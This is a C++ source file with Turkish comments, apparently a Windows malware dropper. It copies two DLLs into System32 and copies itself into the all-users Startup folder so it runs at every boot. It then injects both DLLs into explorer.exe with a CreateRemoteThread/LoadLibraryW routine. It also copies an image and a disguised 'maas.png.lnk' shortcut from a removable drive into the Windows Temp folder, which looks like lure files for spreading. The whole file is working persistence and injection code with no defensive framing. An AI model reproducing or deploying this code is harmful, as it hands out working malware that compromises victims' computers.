#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <shlwapi.h>  // PathFileExists fonksiyonu için

#pragma comment(lib, "shlwapi.lib") // Linking with shlwapi.lib

DWORD GetProcessId(const wchar_t* processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (Process32First(snapshot, &entry)) {
        do {
            if (!_wcsicmp(entry.szExeFile, processName)) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

void InjectDLL(DWORD processId, const wchar_t* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess) {
        SIZE_T pathLength = (wcslen(dllPath) + 1) * sizeof(wchar_t);

        void* pAlloc = VirtualAllocEx(hProcess, NULL, pathLength, MEM_COMMIT, PAGE_READWRITE);
        if (pAlloc) {
            WriteProcessMemory(hProcess, pAlloc, dllPath, pathLength, NULL);

            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, pAlloc, 0, NULL);
            if (hThread) {
                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
            }

            VirtualFreeEx(hProcess, pAlloc, 0, MEM_RELEASE);
        }

        CloseHandle(hProcess);
    }
}

bool CopyDllToSystem32(const std::wstring& dllFileName) {
    wchar_t exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    std::wstring exeDirectory(exePath);
    size_t pos = exeDirectory.find_last_of(L"\\");
    std::wstring dir = exeDirectory.substr(0, pos + 1);

    std::wstring sourcePath = dir + dllFileName;
    std::wstring destinationPath = L"C:\\Windows\\System32\\" + dllFileName;

    // Eğer dosya zaten varsa, kopyalamayı atla
    if (PathFileExists(destinationPath.c_str())) {
        return true; // Kopyalama atlanır, true döner
    }

    // Dosya kopyalama işlemi
    if (CopyFile(sourcePath.c_str(), destinationPath.c_str(), FALSE)) {
        return true;
    }
    else {
        return false;
    }
}

bool CopyExeToStartUp() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    std::wstring exeDirectory(exePath);
    size_t pos = exeDirectory.find_last_of(L"\\");
    std::wstring dir = exeDirectory.substr(0, pos + 1);

    std::wstring sourcePath = dir + L"REVDllInjector.exe";
    std::wstring destinationPath = L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\REVDllInjector.exe";

    // Eğer dosya zaten varsa, kopyalamayı atla
    if (PathFileExists(destinationPath.c_str())) {
        return true; // Kopyalama atlanır, true döner
    }

    // Dosya kopyalama işlemi
    if (CopyFile(sourcePath.c_str(), destinationPath.c_str(), FALSE)) {
        return true;
    }
    else {
        return false;
    }
}

std::wstring FindDllInPath(const std::wstring& dllFileName) {
    wchar_t exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    std::wstring exeDirectory(exePath);
    size_t pos = exeDirectory.find_last_of(L"\\");
    std::wstring dir = exeDirectory.substr(0, pos + 1);

    // İlk olarak bulunduğu dizine bak
    std::wstring sourcePath = dir + dllFileName;
    if (PathFileExists(sourcePath.c_str())) {
        return sourcePath;  // DLL bulunduğu dizinde var, geri dön
    }

    // Eğer bulunamadıysa C:\Windows\System32 dizinine bak
    sourcePath = L"C:\\Windows\\System32\\" + dllFileName;
    if (PathFileExists(sourcePath.c_str())) {
        return sourcePath;  // DLL System32'de var, geri dön
    }

    return L""; // DLL bulunamadı
}

bool CopyFilesToTemp() {
    std::wstring sourcePath1 = L"E:\\image.png";
    std::wstring sourcePath2 = L"E:\\maas.png.lnk";
    std::wstring destPath1 = L"C:\\Windows\\Temp\\image.png";
    std::wstring destPath2 = L"C:\\Windows\\Temp\\maas.png.lnk";

    // Eğer dosyalar zaten varsa, kopyalamayı atla
    bool success1 = true, success2 = true;

    if (!PathFileExists(destPath1.c_str())) {
        success1 = CopyFile(sourcePath1.c_str(), destPath1.c_str(), FALSE);
    }

    if (!PathFileExists(destPath2.c_str())) {
        success2 = CopyFile(sourcePath2.c_str(), destPath2.c_str(), FALSE);
    }

    return success1 && success2;
}

int main() {
    // DLL dosyalarının adları
    std::wstring dll1 = L"REVDll.dll";
    std::wstring dll2 = L"REVDlls.dll";

    // DLL dosyalarını C:\Windows\System32 dizinine kopyala
    CopyDllToSystem32(dll1);
    CopyDllToSystem32(dll2);

    // Programın kendi kopyasını StartUp dizinine kopyala
    CopyExeToStartUp();

    // DLL'lerin bulunduğu yolu kontrol et
    std::wstring dllPath1 = FindDllInPath(dll1);
    std::wstring dllPath2 = FindDllInPath(dll2);

    if (!dllPath1.empty() && !dllPath2.empty()) {
        DWORD processId = GetProcessId(L"explorer.exe");

        if (processId) {
            InjectDLL(processId, dllPath1.c_str());
            InjectDLL(processId, dllPath2.c_str());
        }
    }

    // image.png ve maas.png dosyalarını C:\Windows\Temp dizinine kopyala
    if (CopyFilesToTemp()) {
        std::wcout << L"Dosyalar başarıyla C:\\Windows\\Temp dizinine kopyalandı." << std::endl;
    }
    else {
        std::wcout << L"Dosyalar kopyalanamadı." << std::endl;
    }

    return 0;
}
